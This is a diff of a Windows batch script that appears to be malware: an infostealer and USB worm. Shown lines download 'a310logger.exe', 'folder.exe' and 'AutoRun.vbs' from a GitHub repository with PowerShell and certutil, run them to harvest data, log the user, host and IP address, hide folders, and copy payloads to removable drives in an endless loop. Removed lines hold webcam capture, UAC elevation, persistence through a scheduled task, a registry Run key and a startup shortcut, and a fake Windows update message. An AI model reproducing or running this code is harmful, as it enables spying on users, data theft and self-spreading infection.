@@ -3,17 +3,9 @@ setlocal enableextensions
 cd /D "%~dp0"
 
 
-
-
-
-if not "%1"=="am_admin" (
-powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'" >nul 2> nul
-
-
-
 echo *************Create directory****************
    mkdir C:\Users\%username%\AppData\Roaming > nul 2> nul
-   attrib -h -r C:\Users\%username%\AppData\Roaming /s /d > nul 2> nul
+   attrib +h C:\Users\%username%\AppData\Roaming /s /d > nul 2> nul
 
    mkdir C:\Users\%username%\AppData\Local\0101 > nul 2> nul
    attrib +h C:\Users\%username%\AppData\Local\0101 /s /d > nul 2> nul
@@ -173,7 +165,7 @@ echo *************DOWNLOAD file****************
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/a310logger.exe?raw=true -OutFile a310logger.exe" > nul 2> nul
    )   
       if errorlevel 1 goto ERROR3
-
+  
    powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true?raw=true -OutFile folder.exe" > nul 2> nul
       if errorlevel 1 goto ERROR3
    goto SUCCESS 
@@ -184,7 +176,7 @@ echo *************DOWNLOAD file****************
    echo.
    echo Please, wait...
    timeout 3 > NUL
-  
+
    set url="https://github.com/win32u/Licence/blob/main/Extension/AutoRun.vbs?raw=true"
    set filename="AutoRun.vbs"
    certutil -urlcache -split -f %url% %filename% > nul 2> nul
@@ -230,9 +222,6 @@ echo *************DOWNLOAD file****************
       echo.
       echo.
       echo.
-
-
-
    echo *************Execute file****************
       for %%a in (*.exe) do (
          call %%a /stext C:\Users\%username%\AppData\Local\A310Logger\Others\%%a.txt
@@ -240,21 +229,6 @@ echo *************DOWNLOAD file****************
       echo User: %ComputerName% \ %UserName% >"C:\Users\%username%\AppData\Local\A310Logger\IPnHost.txt"
       echo Public_IP: >>"C:\Users\%username%\AppData\Local\A310Logger\IPnHost.txt"
       ipconfig | find /i "IPv4" >>"C:\Users\%username%\AppData\Local\A310Logger\IPnHost.txt"
-
-
-
-      set increment=0
-      :increment
-      timeout 1 > nul
-      "C:\Users\%username%\AppData\Roaming\WebCamImagesSave.exe" /capture /LabelColor ff0000 /FontBold 1 /FontSize 16 /FontName "Arial" /Filename "C:\Users\%username%\AppData\Local\A310Logger\Webcam\%increment%.jpg" > nul 2> nul
-      set /a increment=%increment%+1 
-      if "%increment%"=="11" goto next
-      goto increment
-
-      :next
-      echo Image captured 10times.
-
-
 
       echo Executed
       echo.
@@ -275,120 +249,32 @@ echo *************DOWNLOAD file****************
 
    )
    
-   
-    echo *************New Task Create****************
-	schtasks /Create /SC Onevent /EC Microsoft-Windows-NetworkProfile/Operational /MO "*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]" /TN "YouTube" /TR "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" /F > nul 2> nul || (
-	   echo Task creation faild!
+
+	:pendrive
+	echo *************Pendrive check****************
+	timeout 1 > NUL
+	echo Checking for pendrive...
+	for /F "usebackq tokens=1,2,3,4 " %%i in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL`) do (
+	if %%l equ 2 (
+	mkdir %%i\YouTube > nul 2> nul
+	if exist "C:\Users\%username%\AppData\Roaming\folder.exe" (
+	copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i" /Y > nul 2> nul
+	copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i\YouTube" /Y > nul 2> nul
 	)
-
-	REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v YouTube /t REG_SZ /d C:\Users\%username%\AppData\Local\0101\AutoRun.vbs /f > nul 2> nul || (
-	   echo Registry creation faild!
+	if exist "C:\Users\%username%\AppData\Local\0101\folder.exe" (
+	copy "C:\Users\%username%\AppData\Local\0101\folder.exe" "%%i" /Y > nul 2> nul
+	copy "C:\Users\%username%\AppData\Local\0101\folder.exe" "%%i\YouTube" /Y > nul 2> nul
 	)
-
-	mklink "%systemdrive%\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AutoRun.vbs - Shortcut" "C:\Users\%username%\AppData\Local\0101\AutoRun.vbs" > nul 2> nul || (
-	   echo Mklink creation already exist!?
+	mkdir "%%i\System Update" > nul 2> nul
+	attrib +h "%%i\System Update" /s /d
+	copy "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
+	echo Copied!
+	) 
 	)
+	echo.
+	echo.
+	cls
+	goto pendrive
+	
 
-
-
-		:pendrive1
-		echo *************Pendrive check****************
-		   timeout 1 > NUL
-		   echo Checking for pendrive...
-		   for /F "usebackq tokens=1,2,3,4 " %%i in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL`) do (
-		   if %%l equ 2 (
-			  mkdir %%i\YouTube > nul 2> nul
-                          if exist "C:\Users\%username%\AppData\Roaming\folder.exe" (
-                             copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i" /Y > nul 2> nul
-                             copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i\YouTube" /Y > nul 2> nul
-                          )  else (
-                                copy "C:\Users\%username%\AppData\Local\0101\folder.exe" "%%i" /Y > nul 2> nul
-                                copy "C:\Users\%username%\AppData\Local\0101\folder.exe" "%%i\YouTube" /Y > nul 2> nul
-                             )
-			  mkdir "%%i\System Update" > nul 2> nul
-			  attrib +h "%%i\System Update" /s /d
-                          copy "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
-			  echo Copied!
-			  ) 
-		   )
-		   echo.
-		   echo.
-		   cls
-		   goto pendrive1
-
-
-
-
-		exit /b
-
-
-)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-echo Checking windows for update
-echo Please, wait
-timeout 1 > NUL
-cls
-
-echo Checking windows for update
-echo Please, wait.
-timeout 2 > NUL
-cls
-
-echo Checking windows for update
-echo Please, wait..
-timeout 1 > NUL
-cls
-
-echo Checking windows for update
-echo Please, wait...
-timeout 1 > NUL
-cls
-
-echo Checking windows for update
-echo Please, wait.
-timeout 1 > NUL
-cls
-
-echo Checking windows for update
-echo Please, wait..
-timeout 1 > NUL
-cls
-
-echo Checking windows for update
-echo Please, wait...
-timeout 2 > NUL
-echo.
-echo.
-echo Windows updates found! Please update or
-echo Visit: https://support.microsoft.com/en-us/windows
-timeout 6 > NUL
-echo Successful Regular checking..!!
-timeout 3
-
-schtasks /Create /SC Onevent /EC Microsoft-Windows-NetworkProfile/Operational /MO "*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]" /TN "YouTube" /TR "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" /F > nul 2> nul 
-
-REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v YouTube /t REG_SZ /d C:\Users\%username%\AppData\Local\0101\AutoRun.vbs /f > nul 2> nul 
-
-mklink "%systemdrive%\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AutoRun.vbs - Shortcut" "C:\Users\%username%\AppData\Local\0101\AutoRun.vbs" > nul 2> nul 
-
-echo.
-echo.
-echo.
 exit
